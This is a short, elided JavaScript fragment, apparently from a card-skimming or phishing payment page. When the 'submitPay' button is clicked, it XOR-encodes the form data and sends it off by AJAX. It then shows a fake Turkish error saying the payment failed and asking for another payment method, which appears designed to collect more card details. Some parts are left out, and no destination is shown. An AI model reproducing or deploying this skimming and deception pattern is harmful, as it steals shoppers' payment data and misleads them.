    ...
    window.addEventListener('load', function() {
        ...
        this.document.getElementById("submitPay").addEventListener('click', function(event) {
            if (form.checkValidity() === false) {
              ...
              const encryptedData = xorEncryptDecrypt(JSON.stringify(JSON_data), key);
              ...
              $.ajax({
                  ...
                  success: function(resultData) {
                      alert("Ödeme gerçekleştirilirken bir hata oluştu. Lütfen farklı bir ödeme yöntemi girin.")
                  }
              });
            }
